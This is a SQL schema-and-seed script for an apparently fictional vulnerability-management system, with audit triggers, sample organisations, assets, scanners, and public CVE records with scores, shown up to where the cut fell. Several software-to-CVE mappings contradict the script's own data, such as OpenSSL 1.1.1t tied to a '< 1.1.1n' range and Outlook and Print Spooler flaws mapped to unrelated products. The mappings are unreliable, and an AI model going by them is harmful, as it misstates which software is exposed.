-- Trigger 1: Auto-log every status change on patch_actions into patch_status_history
CREATE OR REPLACE FUNCTION trg_fn_patch_status_audit()
RETURNS TRIGGER AS $$
BEGIN
    IF OLD.status IS DISTINCT FROM NEW.status THEN
        INSERT INTO patch_status_history (
            action_id_fk, old_status, new_status,
            changed_by_fk, change_reason, automated
        )
        VALUES (
            NEW.action_id, OLD.status, NEW.status,
            NEW.assigned_to_fk,
            'Status changed from ' || COALESCE(OLD.status,'NULL') || ' to ' || NEW.status,
            FALSE
        );
    END IF;
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER trg_patch_status_audit
AFTER UPDATE ON patch_actions
FOR EACH ROW EXECUTE FUNCTION trg_fn_patch_status_audit();


-- Trigger 2: Before insert on scan_findings — auto-set discovered_at,
--            compute risk score, resolve SLA due date
CREATE OR REPLACE FUNCTION trg_fn_finding_pre_insert()
RETURNS TRIGGER AS $$
DECLARE
    v_cvss      NUMERIC;
    v_epss      NUMERIC;
    v_exploit   BOOLEAN;
    v_severity  VARCHAR(20);
    asset_crit  INTEGER;
    org_id_val  INTEGER;
    sla_days    INTEGER;
BEGIN
    IF NEW.discovered_at IS NULL THEN
        NEW.discovered_at := NOW();
    END IF;
    NEW.last_seen_at := NOW();

    -- Compute risk score if not supplied
    IF NEW.risk_score IS NULL THEN
        SELECT v.cvss_score, v.epss_score, v.exploit_available, v.severity
        INTO v_cvss, v_epss, v_exploit, v_severity
        FROM software_vulnerabilities sv
        JOIN vulnerabilities v ON sv.vuln_id_fk = v.vuln_id
        WHERE sv.sw_vuln_id = NEW.sw_vuln_id_fk;

        SELECT a.criticality, a.org_id_fk INTO asset_crit, org_id_val
        FROM assets a WHERE a.asset_id = NEW.asset_id_fk;

        NEW.risk_score := fn_finding_risk_score(v_cvss, v_epss, asset_crit, v_exploit);

        -- Resolve SLA due date if not supplied
        IF NEW.sla_due_date IS NULL THEN
            SELECT max_days_to_remediate INTO sla_days
            FROM remediation_sla_policies
            WHERE org_id_fk = org_id_val AND severity = v_severity AND is_active = TRUE
            LIMIT 1;
            IF sla_days IS NOT NULL THEN
                NEW.sla_due_date := CURRENT_DATE + sla_days;
            END IF;
        END IF;
    END IF;

    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER trg_finding_pre_insert
BEFORE INSERT ON scan_findings
FOR EACH ROW EXECUTE FUNCTION trg_fn_finding_pre_insert();


-- Trigger 3: After a finding is marked Remediated, set first_fixed_at timestamp
CREATE OR REPLACE FUNCTION trg_fn_finding_remediated()
RETURNS TRIGGER AS $$
BEGIN
    IF OLD.status IS DISTINCT FROM NEW.status
       AND NEW.status = 'Remediated'
       AND NEW.first_fixed_at IS NULL THEN
        NEW.first_fixed_at := NOW();
    END IF;
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER trg_finding_remediated
BEFORE UPDATE ON scan_findings
FOR EACH ROW EXECUTE FUNCTION trg_fn_finding_remediated();


-- Trigger 4: Auto-set updated_at on organizations whenever a row changes
CREATE OR REPLACE FUNCTION trg_fn_org_updated_at()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at := NOW();
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER trg_org_updated_at
BEFORE UPDATE ON organizations
FOR EACH ROW EXECUTE FUNCTION trg_fn_org_updated_at();


-- ============================================================
-- SEED DATA
-- ============================================================

-- Organizations
INSERT INTO organizations (org_name, industry, hq_country, employee_count, revenue_tier, regulatory_scope, security_contact) VALUES
('Meridian Financial Group',    'Financial Services', 'US', 12400, 'Fortune500', 'PCI-DSS, SOC2 Type II, FFIEC, GLBA', 'ciso@meridianfg.com'),
('NovaBio Therapeutics',        'Healthcare',         'US',  3200, 'Enterprise',  'HIPAA, FDA 21 CFR Part 11, SOC2',    'security@novabio.com'),
('Apex Cloud Infrastructure',   'Technology',         'US',  8900, 'Enterprise',  'SOC2 Type II, ISO 27001, FedRAMP',   'infosec@apexcloud.io'),
('Harrington Retail Systems',   'Retail',             'US',  5600, 'Mid-Market',  'PCI-DSS, CCPA',                      'it-security@harrington.com'),
('CivicNet Government Services','Government',         'US',  1800, 'Mid-Market',  'FedRAMP, FISMA, NIST 800-53',        'security@civicnet.gov');

-- Users
INSERT INTO users (org_id_fk, username, full_name, email, department, job_title, role, mfa_enabled, is_active) VALUES
-- Meridian Financial Group (org 1)
(1, 'e.nakamura',  'Elena Nakamura',    'e.nakamura@meridianfg.com',   'Information Security', 'CISO',                       'admin',             TRUE, TRUE),
(1, 'r.chen',      'Raymond Chen',      'r.chen@meridianfg.com',       'Information Security', 'Sr. Security Engineer',      'security_engineer', TRUE, TRUE),
(1, 'k.patel',     'Kavita Patel',      'k.patel@meridianfg.com',      'IT Operations',        'Patch Manager',              'patch_manager',     TRUE, TRUE),
(1, 's.okonkwo',   'Samuel Okonkwo',    's.okonkwo@meridianfg.com',    'Audit & Compliance',   'Senior Auditor',             'auditor',           TRUE, TRUE),
-- NovaBio Therapeutics (org 2)
(2, 'l.vasquez',   'Lucia Vasquez',     'l.vasquez@novabio.com',       'IT Security',          'Security Director',          'admin',             TRUE, TRUE),
(2, 'm.thornton',  'Marcus Thornton',   'm.thornton@novabio.com',      'IT Security',          'Vulnerability Analyst',      'analyst',           TRUE, TRUE),
(2, 'a.kim',       'Ariel Kim',         'a.kim@novabio.com',           'IT Operations',        'Systems Engineer',           'security_engineer', FALSE,TRUE),
-- Apex Cloud Infrastructure (org 3)
(3, 'j.oduya',     'James Oduya',       'j.oduya@apexcloud.io',        'Security Operations',  'Security Operations Lead',   'admin',             TRUE, TRUE),
(3, 'p.mueller',   'Petra Mueller',     'p.mueller@apexcloud.io',      'Security Operations',  'Cloud Security Engineer',    'security_engineer', TRUE, TRUE),
(3, 'd.santos',    'Diego Santos',      'd.santos@apexcloud.io',       'DevSecOps',            'DevSecOps Engineer',         'security_engineer', TRUE, TRUE),
-- Harrington Retail Systems (org 4)
(4, 'b.franklin',  'Beth Franklin',     'b.franklin@harrington.com',   'IT',                   'IT Security Manager',        'admin',             FALSE,TRUE),
(4, 'c.reed',      'Carlos Reed',       'c.reed@harrington.com',       'IT',                   'Security Analyst',           'analyst',           FALSE,TRUE),
-- CivicNet Government Services (org 5)
(5, 't.washington','Thomas Washington', 't.washington@civicnet.gov',   'Cybersecurity',        'ISSO',                       'admin',             TRUE, TRUE),
(5, 'n.bishop',    'Naomi Bishop',      'n.bishop@civicnet.gov',       'Cybersecurity',        'Security Analyst II',        'analyst',           TRUE, TRUE);

-- Asset Groups
INSERT INTO asset_groups (org_id_fk, group_name, group_type, description, owner_id_fk) VALUES
(1, 'DMZ Perimeter',          'Network Zone',      'Internet-facing perimeter hosts',           2),
(1, 'Core Banking Tier',      'Criticality Tier',  'Transaction processing systems',            2),
(1, 'Corporate Workstations', 'Business Unit',     'Finance and operations endpoints',          3),
(2, 'Clinical Data Systems',  'Compliance Scope',  'Systems handling PHI/ePHI data',            6),
(2, 'Lab Automation',         'Business Unit',     'Laboratory instrument controllers',         7),
(3, 'Kubernetes Clusters',    'Network Zone',      'Container orchestration infrastructure',    9),
(3, 'CI/CD Pipeline',         'Business Unit',     'Build and deployment systems',              10),
(4, 'PCI Cardholder Data Env','Compliance Scope',  'Systems in PCI-DSS scope',                  12),
(5, 'Classified Segment',     'Network Zone',      'FISMA High systems',                        13);

-- Assets
INSERT INTO assets (org_id_fk, owner_id_fk, hostname, fqdn, ip_address, mac_address, asset_type, operating_system, os_version, cpu_count, ram_gb, criticality, business_impact, environment, network_zone, is_active, last_seen_at) VALUES
-- Meridian Financial Group
(1, 2, 'mfg-web-prod-01',   'mfg-web-prod-01.meridianfg.internal',   '10.0.1.10',  '00:1A:2B:3C:4D:01', 'Web Application Server',  'RHEL', '9.3',  4, 64.0,  5, 'Customer portal — 2M daily sessions',            'Production', 'DMZ',        TRUE, NOW() - INTERVAL '2 hours'),
(1, 2, 'mfg-web-prod-02',   'mfg-web-prod-02.meridianfg.internal',   '10.0.1.11',  '00:1A:2B:3C:4D:02', 'Web Application Server',  'RHEL', '9.3',  4, 64.0,  5, 'Customer portal — load balanced pair',           'Production', 'DMZ',        TRUE, NOW() - INTERVAL '2 hours'),
(1, 2, 'mfg-db-prod-01',    'mfg-db-prod-01.meridianfg.internal',    '10.0.2.10',  '00:1A:2B:3C:4D:03', 'Database Server',         'RHEL', '9.3',  16, 256.0, 5, 'Primary OLTP database — transaction ledger',     'Production', 'Data Tier',  TRUE, NOW() - INTERVAL '1 hour'),
(1, 2, 'mfg-db-prod-02',    'mfg-db-prod-02.meridianfg.internal',    '10.0.2.11',  '00:1A:2B:3C:4D:04', 'Database Server',         'RHEL', '9.3',  16, 256.0, 5, 'Secondary replica — failover standby',           'Production', 'Data Tier',  TRUE, NOW() - INTERVAL '1 hour'),
(1, 3, 'mfg-vpn-gw-01',     'mfg-vpn-gw-01.meridianfg.internal',    '203.0.113.5','00:1A:2B:3C:4D:05', 'VPN Gateway',             'Ubuntu', '22.04',2, 16.0,  4, 'Employee VPN — 5000 concurrent users',           'Production', 'DMZ',        TRUE, NOW() - INTERVAL '4 hours'),
(1, 3, 'mfg-ws-fin-042',    'mfg-ws-fin-042.meridianfg.internal',    '192.168.1.42','00:1A:2B:3C:4D:06','Workstation',             'Windows 11', '23H2', 8, 32.0, 3, 'Finance analyst workstation',                   'Corporate',  'Corporate',  TRUE, NOW() - INTERVAL '6 hours'),
-- NovaBio Therapeutics
(2, 6, 'nbio-ehr-prod-01',  'nbio-ehr-prod-01.novabio.internal',     '10.10.1.10', '00:2B:3C:4D:5E:01', 'Application Server',      'Windows Server', '2022', 8, 128.0, 5, 'EHR system — PHI for 180k patients',          'Production', 'Clinical',   TRUE, NOW() - INTERVAL '3 hours'),
(2, 7, 'nbio-lab-ctrl-01',  'nbio-lab-ctrl-01.novabio.internal',     '10.10.2.10', '00:2B:3C:4D:5E:02', 'Industrial Control System','Windows Server', '2019', 4, 32.0,  5, 'Lab automation controller — GxP environment', 'Production', 'Lab',        TRUE, NOW() - INTERVAL '5 hours'),
(2, 6, 'nbio-db-prod-01',   'nbio-db-prod-01.novabio.internal',      '10.10.1.20', '00:2B:3C:4D:5E:03', 'Database Server',         'Ubuntu', '20.04', 8, 128.0, 5, 'Clinical trial data warehouse',                'Production', 'Clinical',   TRUE, NOW() - INTERVAL '1 hour'),
(2, 7, 'nbio-dev-ws-07',    'nbio-dev-ws-07.novabio.internal',       '192.168.10.7','00:2B:3C:4D:5E:04','Workstation',             'macOS',  '14.3',  8, 16.0,  2, 'Research scientist workstation',               'Corporate',  'Corporate',  TRUE, NOW() - INTERVAL '8 hours'),
-- Apex Cloud Infrastructure
(3, 9, 'apex-k8s-master-01','apex-k8s-master-01.apexcloud.internal', '10.20.1.10', '00:3C:4D:5E:6F:01', 'Kubernetes Control Plane','Ubuntu', '22.04', 8, 64.0,  5, 'K8s control plane — 300+ tenant clusters',     'Production', 'Kubernetes', TRUE, NOW() - INTERVAL '30 minutes'),
(3, 9, 'apex-k8s-node-07',  'apex-k8s-node-07.apexcloud.internal',   '10.20.1.17', '00:3C:4D:5E:6F:02', 'Kubernetes Worker Node',  'Ubuntu', '22.04', 32,256.0,  4, 'Workload node — multi-tenant compute',         'Production', 'Kubernetes', TRUE, NOW() - INTERVAL '30 minutes'),
(3, 10,'apex-build-01',     'apex-build-01.apexcloud.internal',      '10.20.2.10', '00:3C:4D:5E:6F:03', 'Build Server',            'Ubuntu', '22.04', 8, 32.0,  4, 'CI/CD pipeline runner — code signing host',    'Production', 'CI/CD',      TRUE, NOW() - INTERVAL '1 hour'),
(3, 9, 'apex-reg-proxy-01', 'apex-reg-proxy-01.apexcloud.internal',  '10.20.3.10', '00:3C:4D:5E:6F:04', 'Container Registry',      'Ubuntu', '22.04', 4, 32.0,  4, 'Private container image registry',             'Production', 'CI/CD',      TRUE, NOW() - INTERVAL '2 hours'),
-- Harrington Retail
(4, 12,'hrt-pos-server-01', 'hrt-pos-server-01.harrington.internal', '10.30.1.10', '00:4D:5E:6F:70:01', 'POS Server',              'Windows Server', '2019', 4, 16.0, 5, 'Central POS processor — 400 store locations',  'Production', 'PCI',        TRUE, NOW() - INTERVAL '4 hours'),
(4, 12,'hrt-ecom-web-01',   'hrt-ecom-web-01.harrington.internal',   '10.30.2.10', '00:4D:5E:6F:70:02', 'Web Server',              'Ubuntu', '20.04', 4, 16.0,  4, 'E-commerce platform — $2M daily transactions',  'Production', 'DMZ',        TRUE, NOW() - INTERVAL '3 hours'),
-- CivicNet Government
(5, 13,'civ-portal-01',     'civ-portal-01.civicnet.gov',            '10.40.1.10', '00:5E:6F:70:81:01', 'Web Application Server',  'RHEL', '8.8',   4, 16.0,  4, 'Citizen services portal — 50k daily users',     'Production', 'DMZ',        TRUE, NOW() - INTERVAL '6 hours'),
(5, 13,'civ-db-prod-01',    'civ-db-prod-01.civicnet.gov',           '10.40.2.10', '00:5E:6F:70:81:02', 'Database Server',         'RHEL', '8.8',   8, 64.0,  5, 'Citizen records database — PII',                'Production', 'Data Tier',  TRUE, NOW() - INTERVAL '2 hours');

-- Asset Group Memberships
INSERT INTO asset_group_memberships (asset_id_fk, group_id_fk, added_by_fk) VALUES
(1, 1, 2),(2, 1, 2),(5, 1, 2),     -- DMZ Perimeter (Meridian)
(3, 2, 2),(4, 2, 2),               -- Core Banking Tier (Meridian)
(6, 3, 3),                         -- Corporate Workstations (Meridian)
(7, 4, 6),(9, 4, 6),               -- Clinical Data Systems (NovaBio)
(8, 5, 7),                         -- Lab Automation (NovaBio)
(11,6, 9),(12,6, 9),               -- Kubernetes Clusters (Apex)
(13,7,10),(14,7,10),               -- CI/CD Pipeline (Apex)
(15,8,12),                         -- PCI Cardholder Data Env (Harrington)
(18,9,13);                         -- Classified Segment (CivicNet)

-- Scan Sources
INSERT INTO scan_sources (org_id_fk, source_name, source_type, vendor, product_version, scan_frequency, last_scan_at, is_active) VALUES
(1, 'Tenable Nessus Professional', 'Vulnerability Scanner', 'Tenable',   '10.7.2', 'Weekly',    NOW() - INTERVAL '18 hours', TRUE),
(1, 'CrowdStrike Falcon',          'EDR',                   'CrowdStrike','7.14',   'Continuous',NOW() - INTERVAL '5 minutes', TRUE),
(2, 'Qualys VMDR',                 'Vulnerability Scanner', 'Qualys',    '12.3',   'Weekly',    NOW() - INTERVAL '24 hours', TRUE),
(3, 'Trivy Container Scanner',     'Cloud Security',        'Aqua',      '0.50.1', 'On-demand', NOW() - INTERVAL '2 hours',  TRUE),
(3, 'Snyk Code',                   'SAST',                  'Snyk',      '1.14',   'Daily',     NOW() - INTERVAL '4 hours',  TRUE),
(4, 'Rapid7 InsightVM',            'Vulnerability Scanner', 'Rapid7',    '6.6.260','Weekly',    NOW() - INTERVAL '30 hours', TRUE),
(5, 'Nessus Professional',         'Vulnerability Scanner', 'Tenable',   '10.6.4', 'Weekly',    NOW() - INTERVAL '48 hours', TRUE);

-- Software Products
INSERT INTO software_products (product_name, vendor, version, product_type, package_manager, cpe_uri, end_of_life_date, is_supported, license_type) VALUES
('Apache HTTP Server',      'Apache Software Foundation', '2.4.54',   'Application',      'apt',  'cpe:2.3:a:apache:http_server:2.4.54:*:*:*:*:*:*:*',   NULL,         TRUE,  'Apache 2.0'),
('OpenSSL',                 'OpenSSL Project',            '1.1.1t',   'Library',          'apt',  'cpe:2.3:a:openssl:openssl:1.1.1t:*:*:*:*:*:*:*',     '2023-09-11', FALSE, 'OpenSSL License'),
('Log4j',                   'Apache Software Foundation', '2.14.1',   'Library',          'maven','cpe:2.3:a:apache:log4j:2.14.1:*:*:*:*:*:*:*',        NULL,         TRUE,  'Apache 2.0'),
('Spring Framework',        'VMware',                     '5.3.20',   'Library',          'maven','cpe:2.3:a:pivotal_software:spring_framework:5.3.20:*:*:*:*:*:*:*', NULL, TRUE, 'Apache 2.0'),
('PostgreSQL',              'PostgreSQL Global Dev Group','14.8',     'Database',         'apt',  'cpe:2.3:a:postgresql:postgresql:14.8:*:*:*:*:*:*:*',  NULL,         TRUE,  'PostgreSQL License'),
('Microsoft SQL Server',    'Microsoft',                  '2019',     'Database',         NULL,   'cpe:2.3:a:microsoft:sql_server:2019:*:*:*:*:*:*:*',   NULL,         TRUE,  'Commercial'),
('Nginx',                   'F5 Networks',                '1.22.1',   'Application',      'apt',  'cpe:2.3:a:f5:nginx:1.22.1:*:*:*:*:*:*:*',            NULL,         TRUE,  'BSD 2-Clause'),
('containerd',              'Cloud Native Computing Foundation','1.6.18','Container Runtime','apt','cpe:2.3:a:linuxfoundation:containerd:1.6.18:*:*:*:*:*:*:*', NULL, TRUE,'Apache 2.0'),
('runc',                    'Open Container Initiative',  '1.1.4',    'Container Runtime','apt',  'cpe:2.3:a:opencontainers:runc:1.1.4:*:*:*:*:*:*:*',  NULL,         TRUE,  'Apache 2.0'),
('curl',                    'Daniel Stenberg',            '7.88.1',   'Application',      'apt',  'cpe:2.3:a:haxx:curl:7.88.1:*:*:*:*:*:*:*',           NULL,         TRUE,  'MIT'),
('OpenSSH',                 'OpenBSD Project',            '9.0p1',    'Application',      'apt',  'cpe:2.3:a:openbsd:openssh:9.0p1:*:*:*:*:*:*:*',      NULL,         TRUE,  'BSD'),
('Windows Server 2019',     'Microsoft',                  '10.0.17763','Operating System',NULL,   'cpe:2.3:o:microsoft:windows_server_2019:10.0.17763:*:*:*:*:*:*:*', NULL, TRUE, 'Commercial'),
('RHEL',                    'Red Hat',                    '9.3',       'Operating System','rpm',  'cpe:2.3:o:redhat:enterprise_linux:9.3:*:*:*:*:*:*:*', NULL,         TRUE,  'Commercial'),
('Ubuntu',                  'Canonical',                  '22.04',     'Operating System','apt',  'cpe:2.3:o:canonical:ubuntu_linux:22.04:*:*:*:*:*:*:*',NULL,         TRUE,  'Various'),
('Python',                  'Python Software Foundation', '3.10.12',  'Application',      'apt',  'cpe:2.3:a:python:python:3.10.12:*:*:*:*:*:*:*',      NULL,         TRUE,  'PSF License');

-- Asset Software Installs
INSERT INTO asset_software_installs (asset_id_fk, software_id_fk, install_path, install_date, detected_by, is_authorized) VALUES
-- mfg-web-prod-01 (asset 1)
(1, 1,  '/usr/sbin/httpd',         '2024-03-10', 'scan',   TRUE),
(1, 2,  '/usr/lib/libssl.so',      '2024-03-10', 'scan',   TRUE),
(1, 7,  '/etc/nginx',              '2024-06-01', 'scan',   TRUE),
(1, 13, NULL,                      '2024-01-15', 'scan',   TRUE),
-- mfg-db-prod-01 (asset 3)
(3, 5,  '/var/lib/postgresql',     '2024-04-01', 'agent',  TRUE),
(3, 2,  '/usr/lib/libssl.so',      '2024-04-01', 'agent',  TRUE),
(3, 13, NULL,                      '2024-01-15', 'scan',   TRUE),
-- mfg-vpn-gw-01 (asset 5)
(5, 11, '/usr/sbin/sshd',          '2024-05-01', 'scan',   TRUE),
(5, 2,  '/usr/lib/libssl.so',      '2024-05-01', 'scan',   TRUE),
(5, 14, NULL,                      '2024-02-01', 'scan',   TRUE),
-- nbio-ehr-prod-01 (asset 7)
(7, 3,  'C:\\app\\log4j-core.jar', '2023-11-15', 'scan',   TRUE),
(7, 4,  'C:\\app\\spring.jar',     '2023-11-15', 'scan',   TRUE),
(7, 6,  NULL,                      '2022-08-01', 'manual', TRUE),
(7, 12, NULL,                      '2022-08-01', 'manual', TRUE),
-- nbio-lab-ctrl-01 (asset 8)
(8, 6,  NULL,                      '2020-01-01', 'manual', TRUE),
(8, 12, NULL,                      '2020-01-01', 'manual', TRUE),
-- apex-k8s-master-01 (asset 11)
(11, 8, '/usr/bin/containerd',     '2024-07-01', 'agent',  TRUE),
(11, 9, '/usr/sbin/runc',          '2024-07-01', 'agent',  TRUE),
(11, 14,NULL,                      '2024-07-01', 'scan',   TRUE),
-- apex-build-01 (asset 13)
(13, 3, '/app/lib/log4j.jar',      '2024-01-10', 'scan',   TRUE),
(13, 10,'/usr/bin/curl',           '2024-01-10', 'scan',   TRUE),
(13, 15,'/usr/bin/python3',        '2024-01-10', 'scan',   TRUE),
-- hrt-pos-server-01 (asset 15)
(15, 6, NULL,                      '2022-06-01', 'manual', TRUE),
(15, 12,NULL,                      '2022-06-01', 'manual', TRUE),
-- hrt-ecom-web-01 (asset 16)
(16, 1, '/usr/sbin/httpd',         '2023-09-01', 'scan',   TRUE),
(16, 7, '/etc/nginx',              '2023-09-01', 'scan',   TRUE),
(16, 2, '/usr/lib/libssl.so',      '2023-09-01', 'scan',   TRUE),
-- civ-portal-01 (asset 17)
(17, 1, '/usr/sbin/httpd',         '2024-01-01', 'scan',   TRUE),
(17, 2, '/usr/lib/libssl.so',      '2024-01-01', 'scan',   TRUE),
(17, 13,NULL,                      '2023-06-01', 'scan',   TRUE),
-- civ-db-prod-01 (asset 18)
(18, 5, '/var/lib/postgresql',     '2024-02-01', 'scan',   TRUE),
(18, 2, '/usr/lib/libssl.so',      '2024-02-01', 'scan',   TRUE);

-- Vulnerabilities (real CVEs with realistic EPSS scores and CVSS vectors)
INSERT INTO vulnerabilities (cve_id, cwe_id, title, severity, cvss_score, cvss_vector, epss_score, epss_percentile, attack_vector, attack_complexity, privileges_required, user_interaction, exploit_available, exploit_maturity, patch_available, published_date, last_modified_date, description) VALUES
('CVE-2021-44228','CWE-917','Log4Shell: Remote Code Execution via JNDI Lookup',             'Critical',10.0,'AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',0.9750,0.9999,'Network','Low','None','None',      TRUE, 'High',              TRUE,  '2021-12-10','2023-02-03','JNDI injection in Apache Log4j 2.x allows unauthenticated RCE.'),
('CVE-2022-0778','CWE-835','OpenSSL Infinite Loop Denial of Service',                       'High',     7.5,'AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H', 0.0280,0.8921,'Network','Low','None','None',      FALSE,'Proof of Concept', TRUE,  '2022-03-15','2022-05-02','Infinite loop in BN_mod_sqrt causes DoS via crafted certificate.'),
('CVE-2021-26855','CWE-918','ProxyLogon: Microsoft Exchange Server SSRF',                   'Critical', 9.8,'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 0.9710,0.9997,'Network','Low','None','None',      TRUE, 'High',              TRUE,  '2021-03-02','2021-07-27','SSRF vulnerability allows unauthenticated attackers to execute code.'),
('CVE-2023-44487','CWE-400','HTTP/2 Rapid Reset Attack (DoS)',                               'High',     7.5,'AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H', 0.0350,0.9250,'Network','Low','None','None',      TRUE, 'High',              TRUE,  '2023-10-10','2024-01-08','RST_STREAM flood enables large-scale HTTP/2 DDoS amplification.'),
('CVE-2024-21626','CWE-22', 'Leaky Vessels: runc Container Escape',                         'High',     8.6,'AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H', 0.0041,0.7105,'Local','Low','None','Required',   TRUE, 'Functional',        TRUE,  '2024-01-31','2024-03-15','Container breakout via /proc/self/fd file descriptor leak in runc.'),
('CVE-2022-22965','CWE-94', 'Spring4Shell: Spring Framework RCE',                           'Critical', 9.8,'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 0.9630,0.9995,'Network','Low','None','None',      TRUE, 'High',              TRUE,  '2022-03-31','2022-04-19','ClassLoader manipulation via DataBinder enables remote code execution.'),
('CVE-2023-25690','CWE-444','Apache HTTP Server Request Smuggling',                          'Critical', 9.8,'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 0.0086,0.8432,'Network','Low','None','None',      FALSE,'Proof of Concept', TRUE,  '2023-03-07','2023-08-26','HTTP request smuggling via mod_proxy in Apache HTTP Server 2.4.x.'),
('CVE-2023-38408','CWE-94', 'OpenSSH Remote Code Execution via ssh-agent',                  'Critical', 9.8,'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 0.0220,0.9640,'Network','Low','None','None',      TRUE, 'Functional',        TRUE,  '2023-07-19','2023-09-06','PKCS#11 provider arbitrary library load in forwarded ssh-agent allows RCE.'),
('CVE-2023-34362','CWE-89', 'MOVEit SQL Injection Leading to RCE',                           'Critical',10.0,'AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', 0.9720,0.9998,'Network','Low','None','None',      TRUE, 'High',              TRUE,  '2023-06-02','2023-08-17','Unauthenticated SQL injection in MOVEit Transfer exploited by Cl0p ransomware.'),
('CVE-2024-3400', 'CWE-77', 'PAN-OS Command Injection (CVSS 10)',                            'Critical',10.0,'AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', 0.9680,0.9997,'Network','Low','None','None',      TRUE, 'High',              TRUE,  '2024-04-12','2024-06-01','OS command injection in GlobalProtect gateway allows unauthenticated RCE.'),
('CVE-2022-3602','CWE-121','OpenSSL X.509 Buffer Overflow',                                  'High',     7.5,'AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H', 0.0019,0.5710,'Network','Low','None','None',      FALSE,'Unproven',          TRUE,  '2022-11-01','2022-12-15','Stack buffer overflow in X.509 certificate verification.'),
('CVE-2023-23397','CWE-294','Microsoft Outlook NTLM Hash Theft (Zero-Click)',                'Critical', 9.8,'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 0.9140,0.9986,'Network','Low','None','None',      TRUE, 'High',              TRUE,  '2023-03-14','2023-04-11','NTLM hash exfiltration via crafted Outlook email with UNC path.'),
('CVE-2021-34527','CWE-269','PrintNightmare: Windows Print Spooler Privilege Escalation',   'Critical', 8.8,'AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H', 0.9680,0.9997,'Network','Low','Low','None',       TRUE, 'High',              TRUE,  '2021-07-01','2022-01-14','Improper privilege management in Print Spooler allows RCE and privilege escalation.'),
('CVE-2022-26134','CWE-74', 'Confluence Server OGNL Injection RCE',                         'Critical',10.0,'AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', 0.9750,0.9999,'Network','Low','None','None',      TRUE, 'High',              TRUE,  '2022-06-02','2022-07-25','Unauthenticated OGNL injection in Confluence Server/Data Center.'),
('CVE-2023-46604','CWE-502','Apache ActiveMQ RCE via ClassInfo Deserialization',            'Critical',10.0,'AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', 0.9730,0.9998,'Network','Low','None','None',      TRUE, 'High',              TRUE,  '2023-10-27','2024-01-25','ClassInfo command deserialization allows unauthenticated RCE in ActiveMQ.');

-- Software-Vulnerability Mappings
INSERT INTO software_vulnerabilities (software_id_fk, vuln_id_fk, affected_version_range, fix_version, patch_url) VALUES
(3,  1,  '2.0.0 - 2.14.1',   '2.17.0', 'https://logging.apache.org/log4j/2.x/security.html'),
(2,  2,  '< 1.1.1n',         '1.1.1n',  'https://www.openssl.org/news/secadv/20220315.txt'),
(4,  6,  '5.3.0 - 5.3.17',   '5.3.18',  'https://spring.io/security/cve-2022-22965'),
(1,  4,  '2.4.0 - 2.4.55',   '2.4.56',  'https://httpd.apache.org/security/vulnerabilities_24.html'),
(8,  4,  '< 1.7.0',          '1.7.0',   'https://github.com/containerd/containerd/security/advisories'),
(9,  5,  '< 1.1.12',         '1.1.12',  'https://github.com/opencontainers/runc/security/advisories'),
(2,  11, '3.0.0 - 3.0.6',    '3.0.7',   'https://www.openssl.org/news/secadv/20221101.txt'),
(11, 8,  '< 9.3p2',          '9.3p2',   'https://www.openssh.com/security.html'),
(1,  7,  '2.4.0 - 2.4.55',   '2.4.56',  'https://httpd.apache.org/security/vulnerabilities_24.html'),
(2,  2,  '3.0.0 - 3.0.6',    '3.0.7',   'https://www.openssl.org/news/secadv/20220315.txt'),
(12, 13, NULL,                NULL,      'https://msrc.microsoft.com/update-guide/'),
(12, 12, NULL,                NULL,      'https://msrc.microsoft.com/update-guide/'),
(6,  13, NULL,                NULL,      'https://msrc.microsoft.com/update-guide/'),
(10, 4,  '< 8.7.1',          '8.7.1',   'https://curl.se/docs/security.html');

-- Remediation SLA Policies
INSERT INTO remediation_sla_policies (org_id_fk, policy_name, severity, max_days_to_remediate, escalation_days, applies_to_env, is_active, created_by_fk) VALUES
-- Meridian Financial Group
(1, 'MFG Critical SLA',  'Critical', 7,  3,  NULL,         TRUE, 1),
(1, 'MFG High SLA',      'High',    15,  7,  NULL,         TRUE, 1),
(1, 'MFG Medium SLA',    'Medium',  45, 14,  NULL,         TRUE, 1),
(1, 'MFG Low SLA',       'Low',     90, 30,  NULL,         TRUE, 1),
-- NovaBio Therapeutics
(2, 'NovaBio Critical',  'Critical', 5,  2,  'Production', TRUE, 5),
(2, 'NovaBio High',      'High',    14,  5,  'Production', TRUE, 5),
(2, 'NovaBio Medium',    'Medium',  30, 10,  'Production', TRUE, 5),
-- Apex Cloud Infrastructure
(3, 'Apex Critical',     'Critical', 3,  1,  NULL,         TRUE, 8),
(3, 'Apex High',         'High',     7,  3,  NULL,         TRUE, 8),
(3, 'Apex Medium',       'Medium',  21,  7,  NULL,         TRUE, 8),
-- Harrington Retail
(4, 'HRT PCI Critical',  'Critical', 7,  2,  'Production', TRUE, 11),
(4, 'HRT PCI High',      'High',    14,  5,  'Production', TRUE, 11),
-- CivicNet Government
(5, 'CivicNet Critical', 'Critical',15,  5,  NULL,         TRUE, 13),
(5, 'CivicNet High',     'High',    30, 10,  NULL,         TRUE, 13);

-- Scan Findings (risk_score and sla_due_date set manually here to match pre-trigger data)
INSERT INTO scan_findings (asset_id_fk, sw_vuln_id_fk, scan_source_id_fk, status, risk_score, sla_due_date, discovered_at, last_seen_at, evidence_snippet, notes) VALUES
-- mfg-web-prod-01: Log4Shell (sw_vuln 1 = log4j/log4shell)
